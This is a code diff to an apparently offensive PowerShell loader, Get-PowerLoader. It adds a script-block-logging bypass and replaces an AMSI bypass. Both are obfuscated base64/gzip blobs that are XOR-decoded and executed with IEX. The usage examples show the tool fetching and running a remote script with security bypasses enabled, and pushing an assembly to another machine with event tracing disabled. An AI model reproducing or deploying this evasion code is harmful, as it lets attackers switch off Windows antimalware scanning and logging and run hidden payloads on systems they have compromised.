@@ -24,10 +24,10 @@ function Get-PowerLoader {
     Specifies the bypass techniques to include.
 
 .EXAMPLE
-    PS C:\> Get-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass AMSI
+    PS C:\> Get-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass AMSI,SBL
 
 .EXAMPLE
-    PS C:\> Get-PowerLoader -Type NetAsm -FilePath .\sharp.exe | Invoke-PowerExec -ComputerList 192.168.0.2
+    PS C:\> Get-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass ETW | Invoke-PowerExec -ComputerList 192.168.0.2
 #>
     [CmdletBinding()]
     Param (
@@ -46,7 +46,7 @@ function Get-PowerLoader {
         [string[]]
         $ArgumentList,
 
-        [ValidateSet("AMSI","ETW")]
+        [ValidateSet("AMSI","SBL","ETW")]
         [string[]]
         $Bypass
     )
@@ -83,8 +83,12 @@ function Get-PowerLoader {
     $srcBypass = ''
     switch ($Bypass) {
         'AMSI' {
-            $srcBypass += '$a = "H4sIAAAAAAAEAD2MsQrCMBQAv8UhoRVLdunQyToIYtUKIhLqa/uEpA+TPAilH2/r4Hhwd+zjKLRxmN/P0D9U4RyYl41qB3yNH0hlFR2DUQdNugMDxKoIPBjNOJAq5lKu5YXROplsRY9g2/w3XA7lgqlccE/Is1lqtNDKTB4HOoWXxSareH41/1pVwDdtA6SCgrWZYB8gmRrNzXusPTJsau0JqVuJ5/QFxk/YMsAAAAA="' + [Environment]::NewLine
+            $srcBypass += '$a = "H4sIAAAAAAAEAB3MwQqCQBCA4Wfx4KCR7Ct4Sg9CtJVBdBh0tAl2XVx3YBEfPuv88/2yxPV5pfdLld6T6W1UJ5J7nCkHHb2QUQ06HMmQE1UGmQwKT06VxjMc4CZsPWQ/VDHZIQfcQ+1Y9lghWxqggPPkLqG33BVadt7tQJM80AbKUxesLVJZAmVbh9J91nZhoWOLi2M3JlA2uk76OKP3yfu/VLB9AarxymS5AAAA"' + [Environment]::NewLine
             $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes($a) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+        }
+        'SBL' {
+            $srcBypass += '$b = "H4sIAAAAAAAEADWOUUsDMRCEf8s9GO6gR/5CUVAEsXhihdKHJdmmW71NuE1WQumPNyf4OMN8M6O5Xg/veD7arQjOnqt9RP2oCw5mqqI42xdIEHDGpHZbNM6gFJOdXKZFHzi6L9OvzBMhnwYjFBJoyShmNLuY3opncqNow1xLTqifwAWHu1SYx2GHP5tX/41Ou//B+8jcdFuRVpwwk7PPIJeGHkQzpXA0fX9zoO5y3WdS3Owhp+a3ir9bnV9/dRxDWF1fFxDpzkCMJ2tuvxHo1jL1AAAA"' + [Environment]::NewLine
+            $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         }
         'ETW' {
             $srcBypass += '& ' + ${function:Invoke-EtwBypass}.Ast.Body.Extent.Text + [Environment]::NewLine
